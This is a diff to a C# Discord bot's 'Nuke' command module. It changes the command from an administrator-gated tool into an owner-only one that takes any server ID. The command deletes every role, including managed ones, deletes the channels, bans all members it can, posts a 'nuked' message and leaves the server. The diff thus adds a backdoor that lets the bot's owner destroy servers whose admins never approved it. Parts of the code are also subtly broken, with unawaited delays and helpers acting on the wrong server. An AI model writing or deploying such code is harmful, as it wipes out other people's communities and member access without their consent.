@@ -12,11 +12,10 @@ using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
 
-namespace Kaida.Modules.Miscellaneous
+namespace Kaida.Modules.Overpowered
 {
     [Group("Nuke")]
-    [RequireUserPermissions(DSharpPlus.Permissions.Administrator)]
-    [RequireBotPermissions(DSharpPlus.Permissions.Administrator)]
+    [RequireOwner]
     public class Nuke : BaseCommandModule
     {
         private readonly ILogger _logger;
@@ -27,23 +26,24 @@ namespace Kaida.Modules.Miscellaneous
         }
 
         [Command("Server")]
-        public async Task NukeServer(CommandContext context, [RemainingText] string reason = null)
+        public async Task NukeServer(CommandContext context, ulong targetGuild, [RemainingText] string reason = null)
         {
             var interactivity = context.Client.GetInteractivity();
 
-
-            var guild = context.Guild;
+            var guild = await context.Client.GetGuildAsync(targetGuild);
             var green = DiscordEmoji.FromName(context.Client, ":green_circle:");
             var red = DiscordEmoji.FromName(context.Client, ":red_circle:");
             var emojis = new DiscordEmoji[] { green, red };
+            var bot = await guild.GetMemberAsync(377449095872118784);
+            var managableMembers = guild.Members.Values.Where(x => x.Hierarchy < bot.Hierarchy).ToList();
 
             var description = new StringBuilder()
-                .AppendLine($"Dear {context.User.Username}, you are going to send out a tactical nuke to this server.")
+                .AppendLine($"Dear {context.User.Username}, you are going to send out a tactical nuke to {guild.Name}.")
                 .AppendLine("Are you sure you want to do this and erase the following listed items?").ToString();
 
             var rolesContent = new StringBuilder()
-                .AppendLine(guild.GetRolesBelowBot().Result.Count.ToString())
-                .AppendLine("Those are the total roles which are below the bot role and which are not managed by other bots.").ToString();
+                .AppendLine(guild.Roles.Where(x => x.Value.Name != "@everyone").ToList().Count().ToString())
+                .AppendLine("Those are the total roles, a few roles might not being deleted.").ToString();
 
             var fields = new List<EmbedField>()
             {
@@ -52,6 +52,12 @@ namespace Kaida.Modules.Miscellaneous
                     Inline = false,
                     Name = "Roles",
                     Value = rolesContent
+                },
+                new EmbedField
+                {
+                    Inline = false,
+                    Name = "Users",
+                    Value = $"{guild.MemberCount} (Bannable: {managableMembers.Count()})"
                 },
                 new EmbedField
                 {
@@ -110,8 +116,14 @@ namespace Kaida.Modules.Miscellaneous
                 await NukeAllRoles(context);
                 await guild.DeleteAllChannelsAsync();
                 await guild.DoBanAllMembers();
-                await guild.CreateChannelAsync("dust", DSharpPlus.ChannelType.Text);
-                await guild.Channels.First().Value.SendMessageAsync("Fuck everyone is gone... upsii");
+                var respondEmbed = new DiscordEmbedBuilder()
+                {
+                    Title = guild.Name,
+                    Description = $"{guild.Name} is nuked!\nUsers banned: {managableMembers.Count()}"
+                };
+                
+                context.RespondAsync(embed: respondEmbed);
+                await guild.LeaveAsync();
             }
         }
 
@@ -140,12 +152,19 @@ namespace Kaida.Modules.Miscellaneous
             foreach (var channel in channels)
             {
                 await channel.DeleteAsync();
+                Task.Delay(TimeSpan.FromSeconds(1));
             }
         }
 
         private async Task NukeAllVoices(CommandContext context)
         {
+            var channels = await context.Guild.GetVoiceChannels();
 
+            foreach (var channel in channels)
+            {
+                await channel.DeleteAsync();
+                Task.Delay(TimeSpan.FromSeconds(1));
+            }
         }
 
         private async Task NukeAllRoles(CommandContext context)
@@ -154,7 +173,7 @@ namespace Kaida.Modules.Miscellaneous
 
             foreach (var role in roles)
             {
-                if (!role.IsManaged && role.Name != "@everyone") role.DeleteAsync();
+                if (role.Name != "@everyone") role.DeleteAsync();
                 Task.Delay(TimeSpan.FromSeconds(1));
             }
         }
